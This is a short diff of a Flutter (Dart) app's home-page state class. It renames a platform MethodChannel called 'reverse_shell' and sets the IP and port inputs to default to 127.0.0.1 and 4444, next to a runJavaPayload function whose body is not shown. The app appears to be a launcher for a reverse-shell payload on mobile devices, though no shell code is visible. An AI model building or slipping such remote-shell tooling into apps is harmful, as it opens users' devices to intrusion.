@@ -24,10 +24,10 @@ class MyHomePage extends StatefulWidget {
 }
 
 class _MyHomePageState extends State<MyHomePage> {
-  static const platform = MethodChannel('com.example.java_in_flutter/reverse_shell');
+  static const platform = MethodChannel('com.example.helloworld/reverse_shell');
 
-  TextEditingController ipController = TextEditingController();
-  TextEditingController portController = TextEditingController();
+  TextEditingController ipController = TextEditingController(text: '127.0.0.1'); // Default IP
+  TextEditingController portController = TextEditingController(text: '4444');   // Default Port
   String result = '';
 
   Future<void> runJavaPayload(String ip, int port) async {
